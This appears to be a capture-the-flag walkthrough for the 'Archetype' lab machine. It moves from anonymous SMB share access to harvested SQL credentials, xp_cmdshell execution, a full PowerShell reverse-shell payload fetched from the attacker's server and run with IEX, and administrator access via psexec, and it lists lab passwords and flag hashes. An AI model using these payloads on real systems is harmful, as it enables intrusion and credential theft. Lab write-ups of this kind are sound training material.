# Archetype 

> Easy | Windows 

<br>

### Process:
1) run autorecon
- `sudo python3 autorecon 10.10.10.27`
- found:
  - 135,139,445 (NetBIOS)
  - 1433 (mssql)

<br>

2a) enumerate 135,139,445 (NetBIOS):
- found share "backups" that was read only
  - connect and inspect with no password: `smbclient //10.10.10.27/backups -N`
  - found "prod.dtsConfig" -- contains password information for sql:
    - ARCHETYPE\sql_svc:M3g4c0rp123
- found share "IPC$" that was read only

<br>

3) try to login to mssql service:
- `python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth` -- sucess
  
4) get a shell:
- reconfigure xp_cmdshell to use powershell commmands:
  - `EXEC sp_configure 'Show Advanced Options', 1;` -> `reconfigure;` -> `sp_configure;`
- get powershell reverse shell on system:
  - create powershell reverse shell on attack (called "shell.ps1"):
  ```ps1
  $client = New-Object System.Net.Sockets.TCPClient("10.10.15.73",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
  ```
  - get onto system using Python web server:
    - `sudo python3 -m http.server 80`
  - create netcat listener to catch reverse shell:
    - `sudo rlwrap nc -nvlp 443`
- download and execute reverse shell through "xp_cmdshell"
  - `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.15.73/shell.ps1\");"`


<br>

5) get flags:
- get the user flag:
  - shell recevies is as "sql_svc" user so can get the user flag
  - `more \Users\sql_svc\Desktop\user.txt`
  - user flag = **3e7b102e78218e935bf3f4951fec21a3**
- get admin flag:
  - need to escalate prvileges:
    - check frequently accessed files or executed commands
    - `type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
    - in PowerShell history file found "backups" drive has been mapped using the local admin credentials "admisistrator:MEGACORP_4adm1n!!"
  - use Impacket's "psexec.py" to gain a privileged shell
    - `psexec.py administrator@10.10.10.27` -> [MEGACORP_4adm1n!!]
  - read admin flag:
    - `more \users\administrator\desktop\root.txt`
    - system flag = **b91ccec3305e98240082d4474b848528**
